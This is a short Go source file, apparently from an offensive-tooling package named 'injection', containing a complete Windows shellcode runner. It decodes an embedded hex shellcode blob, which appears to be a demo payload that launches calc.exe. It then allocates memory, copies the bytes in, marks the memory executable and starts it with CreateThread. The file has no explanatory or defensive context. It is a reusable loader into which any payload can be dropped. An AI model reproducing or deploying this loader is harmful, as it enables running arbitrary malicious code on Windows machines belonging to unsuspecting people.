package injection

import (
	"encoding/hex"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateThread() {
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	CreateThread := kernel32.NewProc("CreateThread")

	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
